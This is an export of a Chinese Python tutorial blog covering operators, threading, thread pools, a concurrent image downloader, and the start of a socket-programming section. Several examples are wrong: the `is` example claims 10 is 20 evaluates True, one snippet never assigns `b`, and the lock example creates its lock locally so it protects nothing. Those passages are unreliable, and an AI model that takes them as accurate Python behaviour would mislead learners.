<h4 id="3-比较运算符"><a href="#3-比较运算符" class="headerlink" title="3. 比较运算符"></a>3. 比较运算符</h4><p>如果关系成立 ，返回True，否则返回False</p>
<p>对字符串比较的是Unicode编码</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;</td>
<td align="center">大于</td>
<td align="center">10 &gt; 20 = Flase</td>
</tr>
<tr>
<td align="center">&gt;=</td>
<td align="center">大于<strong>或</strong>等于</td>
<td align="center">10 &gt;= 20 = Flase</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">小于</td>
<td align="center">10 &lt; 20 = True</td>
</tr>
<tr>
<td align="center">&lt;=</td>
<td align="center">小于<strong>或</strong>等于</td>
<td align="center">10 &lt;= 20 = True</td>
</tr>
<tr>
<td align="center">==</td>
<td align="center">比较双方是否<strong>相等</strong></td>
<td align="center">10 == 20 = Flase</td>
</tr>
<tr>
<td align="center">!=</td>
<td align="center">比较双方是否<strong>不相等</strong></td>
<td align="center">10 != 20 = True</td>
</tr>
</tbody></table>
<h4 id="4-逻辑运算符"><a href="#4-逻辑运算符" class="headerlink" title="4. 逻辑运算符"></a>4. 逻辑运算符</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">and</td>
<td align="center">布尔与，找False，如果没有，则返回右边的值</td>
<td align="center">10 and 20 = 20</td>
</tr>
<tr>
<td align="center">or</td>
<td align="center">布尔或，找True，如果没有，则返回右边的值</td>
<td align="center">10 or 20 = 10</td>
</tr>
<tr>
<td align="center">not</td>
<td align="center">布尔非，如果为Ture，则返回False；如果为False，则返回Ture；</td>
<td align="center">not(10 and 20) = False</td>
</tr>
</tbody></table>
<h4 id="5-条件运算符"><a href="#5-条件运算符" class="headerlink" title="5. 条件运算符"></a>5. 条件运算符</h4><p>语法： 语句1 if 条件表达式 else 语句2<br>        如果判断结果为True，则执行语句1，并返回执行结果<br>        如果判断结果为False，则执行语句2，并返回执行结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;10大&quot;</span> <span class="keyword">if</span> <span class="number">10</span> &gt; <span class="number">20</span> <span class="keyword">else</span> <span class="string">&quot;20大&quot;</span></span><br><span class="line"><span class="string">&quot;20大&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="6-身份运算符"><a href="#6-身份运算符" class="headerlink" title="6. 身份运算符"></a>6. 身份运算符</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">is</td>
<td align="center">比较两个对象是否是同一个对象，比较的是对象的id</td>
</tr>
<tr>
<td align="center">is not</td>
<td align="center">比较两个对象是否不是同一个对象，比较的是对象的id</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;qaz&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;qaz&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;qaz&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="string">&#x27;q&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> <span class="keyword">not</span> b</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>整数缓存</p>
<p>当使用is比较整数的ID的时候</p>
<p>在交互模式下，以下范围整数的ID一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[-5,256]</span><br></pre></td></tr></table></figure>

<p>在文件内，以下范围整数的ID一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;=-5</span><br></pre></td></tr></table></figure>



<h4 id="7-成员运算符"><a href="#7-成员运算符" class="headerlink" title="7. 成员运算符"></a>7. 成员运算符</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">in</td>
<td align="center">判断成员是否在指定对象中</td>
</tr>
<tr>
<td align="center">not in</td>
<td align="center">判断成员是否不在指定对象中</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = &#123;<span class="string">&#x27;aa&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;bb&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">in</span> a</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">in</span> b</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;aa&#x27;</span> <span class="keyword">in</span> c</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">in</span> c</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> c</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">in</span> d</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>



<h4 id="8-位运算符"><a href="#8-位运算符" class="headerlink" title="8. 位运算符"></a>8. 位运算符</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;</td>
<td align="center">与运算符，比较两个值的二进制，两个值都为1，则该位结果为1，否则为0</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">或运算符，比较两个值的二进制，对应的位有一个为1时，结果为1</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">异或运算符，比较两个值的二进制，对应的位相异时，结果为1</td>
</tr>
<tr>
<td align="center">~</td>
<td align="center">取反运算符，对数值的每个二进制位取反，即把1变成0，0变成1; 也就是~x = -x -1</td>
</tr>
<tr>
<td align="center">&lt;&lt;</td>
<td align="center">左移动运算符，把左边数值的各二进制位全部左移若干位，右边的数指定移动的位数</td>
</tr>
<tr>
<td align="center">&gt;&gt;</td>
<td align="center">右移动运算符，把左边数值的各二进制位全部右移若干位，右边的数指定移动的位数</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">60</span></span><br><span class="line">0011 <span class="number">1100</span></span><br><span class="line">b = <span class="number">13</span></span><br><span class="line"><span class="number">0000</span> <span class="number">1101</span></span><br><span class="line"></span><br><span class="line">a &amp; b</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">0000</span> <span class="number">1100</span></span><br><span class="line"></span><br><span class="line">a | b</span><br><span class="line"><span class="number">61</span></span><br><span class="line">0011 <span class="number">1101</span></span><br><span class="line"></span><br><span class="line">a ^ b</span><br><span class="line"><span class="number">49</span></span><br><span class="line">0011 0001</span><br><span class="line"></span><br><span class="line">~b = -<span class="number">14</span></span><br><span class="line">最前面<span class="number">0</span>表示正数，<span class="number">1</span>表示负数</span><br><span class="line">转二进制: <span class="number">0</span> <span class="number">1101</span></span><br><span class="line">计算补码: <span class="number">0</span> <span class="number">1101</span></span><br><span class="line">按位取反: <span class="number">1</span> 0010</span><br><span class="line">转为原码</span><br><span class="line">按位取反: <span class="number">1</span> <span class="number">1101</span></span><br><span class="line">末位加一: <span class="number">1</span> <span class="number">1110</span></span><br><span class="line"><span class="number">1</span> <span class="number">1110</span>转为<span class="number">10</span>进制就是-<span class="number">14</span></span><br><span class="line">~b = -b - <span class="number">1</span> = -<span class="number">13</span> - <span class="number">1</span> = -<span class="number">14</span></span><br><span class="line"></span><br><span class="line">a &lt;&lt; <span class="number">2</span> = <span class="number">240</span></span><br><span class="line"><span class="number">60</span>:	 0011 <span class="number">1100</span></span><br><span class="line"><span class="number">240</span>: <span class="number">1111</span> <span class="number">0000</span></span><br><span class="line"></span><br><span class="line">b &gt;&gt; <span class="number">2</span> = <span class="number">3</span></span><br><span class="line"><span class="number">13</span>:	<span class="number">0000</span> <span class="number">1101</span></span><br><span class="line"><span class="number">3</span>:  <span class="number">0000</span> 0011</span><br></pre></td></tr></table></figure>



<h3 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h3><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">**</td>
<td align="center">指数（最高优先级）</td>
</tr>
<tr>
<td align="center">~ + -</td>
<td align="center">按位翻转，一元加号和减号（+@和-@）</td>
</tr>
<tr>
<td align="center">* / % //</td>
<td align="center">乘，除，取余，整除</td>
</tr>
<tr>
<td align="center">+ -</td>
<td align="center">加法减法</td>
</tr>
<tr>
<td align="center">&gt;&gt; &lt;&lt;</td>
<td align="center">右，左移运算符</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center">位and</td>
</tr>
<tr>
<td align="center">^ |</td>
<td align="center">位运算符</td>
</tr>
<tr>
<td align="center">&lt;= &lt; &gt; &gt;=</td>
<td align="center">比较运算符</td>
</tr>
<tr>
<td align="center">== !=</td>
<td align="center">等于运算符</td>
</tr>
<tr>
<td align="center">= %= /= //= -= += *= **=</td>
<td align="center">赋值运算符</td>
</tr>
<tr>
<td align="center">is is not</td>
<td align="center">身份运算符</td>
</tr>
<tr>
<td align="center">in not in</td>
<td align="center">成员运算符</td>
</tr>
<tr>
<td align="center">not and or</td>
<td align="center">逻辑运算符</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-多线程</title>
    <url>//1b2ed340bfce.html</url>
    <content><![CDATA[<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>​        线程（Thread）是操作系统能够进行运算调度的最小单位。被包含在进程中，是进程中的实际运作单位。</p>
<p>一个进程中可以有多个线程，每个线程并执行不同的任务。</p>
<h2 id="Threading模块"><a href="#Threading模块" class="headerlink" title="Threading模块"></a>Threading模块</h2><p>语法：</p>
<p><code>threading.Thread(group=None,target=None,name=None,args=(),kwargs=&#123;&#125;,daemon=None)</code></p>
<ul>
<li>group：值为<code>None</code>，为了之后扩展<code>ThreadGroup</code>类而保留</li>
<li>target：表示一个可调用对象，线程启动时，<code>run()</code>方法将调用此对象，默认值为<code>None</code>，表示不调用任何内容</li>
<li>name：表示当前线程名称，默认创建一个Thread-N格式的唯一名称</li>
<li>args：表示传递给target函数的参数元组</li>
<li>kwargs：表示传递给target函数的参数字典</li>
<li>daemon：用于设置是否为守护模式，默认值为<code>None</code>,线程将继承当前线程的守护模式属性</li>
</ul>
<p><code>threading.Thread</code>方法</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">start()</td>
<td align="center">线程的开始</td>
</tr>
<tr>
<td align="center">join()</td>
<td align="center">线程的阻塞，用于线程结束后再执行后面的代码</td>
</tr>
<tr>
<td align="center">run()</td>
<td align="center">定义线程功能的方法（通常在子类中被应用开发者重写）</td>
</tr>
<tr>
<td align="center">name</td>
<td align="center">返回线程的名字</td>
</tr>
</tbody></table>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">例1</button></li><li class="tab"><button type="button" data-href="#-2">例2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time</span>():</span></span><br><span class="line">    i = <span class="number">10</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;this is&quot;</span>, i, <span class="string">&quot;number is&quot;</span>, threading.Thread(target=time).name)</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    add_thread = []</span><br><span class="line">    add_thread.append(threading.Thread(target=time))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠一秒钟&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    add_thread = []</span><br><span class="line">    <span class="comment"># 创建一个列表，并使用循环创建十个线程添加到列表里</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_thread.append(threading.Thread(target=timeing))</span><br><span class="line">    <span class="comment"># 开始十个线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="comment"># 阻塞十个线程,用于在线程完成之后再执行后面的代码</span></span><br><span class="line">    <span class="comment"># start()和join()不能在循环里面放在一起使用,不然就会结束一个线程后才开始下一个线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.join()</span><br><span class="line">    finish = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line">    <span class="comment"># 返回代码执行的时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">睡眠一秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">1.0</span> 秒</span><br><span class="line"><span class="comment"># 这里可以看到我们使用线程后，可以同时执行十次代码，所有的线程都是一秒内执行结束</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="线程锁定"><a href="#线程锁定" class="headerlink" title="线程锁定"></a>线程锁定</h2><p>避免数值被多个线程作相同的修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time</span>():</span></span><br><span class="line">    i = <span class="number">10</span></span><br><span class="line">  	<span class="comment"># 建立Lock()对象</span></span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    <span class="comment"># 锁定</span></span><br><span class="line">    <span class="comment"># 获得锁，成功获得锁定后返回 True</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;this is&quot;</span>, i, <span class="string">&quot;number is&quot;</span>, threading.Thread(target=time).name)</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="comment"># 释放</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    add_thread = []</span><br><span class="line">    add_thread.append(threading.Thread(target=time))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">创建线程池</button></li><li class="tab"><button type="button" data-href="#-2">使用列表迭代</button></li><li class="tab"><button type="button" data-href="#-3">map()函数映射</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠&quot;</span>,s,<span class="string">&quot;秒钟&quot;</span>)</span><br><span class="line">    time.sleep(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;睡眠结束&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with concurrent.futures.ThreadPoolExecutor() as executor:</span></span><br><span class="line"><span class="comment">#     results = []</span></span><br><span class="line"><span class="comment">#     for _ in range(10):</span></span><br><span class="line"><span class="comment">#         results.append(executor.submit(timeing,1))</span></span><br><span class="line"><span class="comment">#     for f in concurrent.futures.as_completed(results):</span></span><br><span class="line"><span class="comment">#         print(f.result())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以使用列表推导式来写代码 </span></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    results = [executor.submit(timeing,<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> concurrent.futures.as_completed(results):</span><br><span class="line">        <span class="built_in">print</span>(f.result())</span><br><span class="line">        </span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">睡眠一秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">1.0</span> 秒</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠&quot;</span>,s,<span class="string">&quot;秒钟&quot;</span>)</span><br><span class="line">    time.sleep(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;睡眠结束&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    secs = [<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">    results = [executor.submit(timeing,sec) <span class="keyword">for</span> sec <span class="keyword">in</span> secs]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> concurrent.futures.as_completed(results):</span><br><span class="line">        <span class="built_in">print</span>(f.result())</span><br><span class="line">        </span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">睡眠<span class="number">5</span>秒钟</span><br><span class="line">睡眠<span class="number">4</span>秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">5.0</span> 秒</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠&quot;</span>,s,<span class="string">&quot;秒钟&quot;</span>)</span><br><span class="line">    time.sleep(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;睡眠结束&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    secs = [<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">    results = executor.<span class="built_in">map</span>(timeing,secs)</span><br><span class="line">    <span class="comment"># 即使for循环被注释也可以成功执行，但是不会return返回值</span></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        </span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">睡眠<span class="number">5</span>秒钟</span><br><span class="line">睡眠<span class="number">4</span>秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">5.0</span> 秒</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urls = [<span class="string">&#x27;url1&#x27;</span>,<span class="string">&#x27;url2&#x27;</span>...]</span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_image</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># 获取图片的字节</span></span><br><span class="line">    img_bytes = requests.get(url).content</span><br><span class="line">    <span class="comment"># 获取图片名字</span></span><br><span class="line">    <span class="comment"># 也可以写成xxx.split(&#x27;/&#x27;)[-1],这样就永远获取最后一个</span></span><br><span class="line">    <span class="comment"># https://xxx.com/[3]/[4]/[5]</span></span><br><span class="line">    img_name = url.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">5</span>]</span><br><span class="line">    <span class="comment"># 如果url后面没有带格式，可以用如下代码为文件添加后缀</span></span><br><span class="line">    <span class="comment"># img_name = f&#x27;&#123;img_name&#125;.jpg&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(img_name,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> img_file:</span><br><span class="line">        img_file.write(img_bytes)</span><br><span class="line">        <span class="built_in">print</span>(img_name,<span class="string">&quot;downloading...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    executor.<span class="built_in">map</span>(download_image,urls)</span><br><span class="line"></span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">wallhaven-gj977q.png downloading...</span><br><span class="line">wallhaven-zm23vw.jpg downloading...</span><br><span class="line">结束在 <span class="number">1.62</span> 秒</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3进阶</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-网络编程</title>
    <url>//03e97fa95e48.html</url>
    <content><![CDATA[<h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><p>​        计算机网络就是把各个计算机连接到一起，让网络中的计算机可以互相通信。</p>
<p>​        网络编程就是如何在程序中实现两台计算机的通信</p>
<h2 id="Socket-简介"><a href="#Socket-简介" class="headerlink" title="Socket 简介"></a>Socket 简介</h2><p>​        为了让两个程序通过网络进行通信，二者均比需使用Socket套接字。Socket用于描述IP地址和端口，是一个通信链的句柄，可以用来实现不同虚拟机或不同计算机之间的通信。</p>
<p>​        在Internet上的主机上一般运行了多个服务软件，同时提供几种服务。每种服务都打开一个Socket，并绑定到一个端口上，不同的端口对应于不同的服务。</p>
<p>Python 提供了两个级别访问的网络服务：</p>
<ul>
<li>低级别的网络服务支持基本的 Socket，它提供了标准的 BSD Sockets API，可以访问底层操作系统Socket接口的全部方法。</li>
<li>高级别的网络服务模块 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。</li>
</ul>
<h2 id="Socket-模块"><a href="#Socket-模块" class="headerlink" title="Socket 模块"></a>Socket 模块</h2><p>语法：</p>
<p>socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)</p>
<ul>
<li>family：地址族，默认为<code>AF_INET</code>（Internet进程间通信）,或者<code>AF_UNIX</code>（用于同一台机器进程间通信）</li>
<li>type：套接字类型，默认为<code>SOCK_STREAM</code>（流式套接字，用于TCP协议），或者SOCK_DGRAM（数据报套接字，用于UDP协议）</li>
<li>proto：协议号，通常可以省略</li>
<li>fileno：如果指定了fileno，会自动检测<code>family</code>,<code>type</code>,<code>proto</code>的值</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">sock = socket.socket()</span><br><span class="line"><span class="comment"># AF_INET,SOCK_STREAM是默认值，也可以不写</span></span><br></pre></td></tr></table></figure>



<h3 id="Socket对象的内置方法"><a href="#Socket对象的内置方法" class="headerlink" title="Socket对象的内置方法"></a>Socket对象的内置方法</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">s.bind()</td>
<td align="center">绑定地址（host，port），在<code>AF_INET</code>下以元组的形式表示</td>
</tr>
<tr>
<td align="center">s.listen()</td>
<td align="center">开始TCP监听，backlog指定拒绝连接之前，挂起的最大数量（平均设置为5，最小为1）</td>
</tr>
<tr>
<td align="center">s.accept()</td>
<td align="center">被动接收TCP客户端连接，并以阻塞的方式等待连接的到来</td>
</tr>
<tr>
<td align="center">s.connect()</td>
<td align="center">主动初始化TCP服务的连接，如果连接出错，则返回<code>socket.error</code>错误</td>
</tr>
<tr>
<td align="center">s.recv()</td>
<td align="center">接收TCP数据，数据以字符串形式返回，bufsize指定接收的最大数据量</td>
</tr>
<tr>
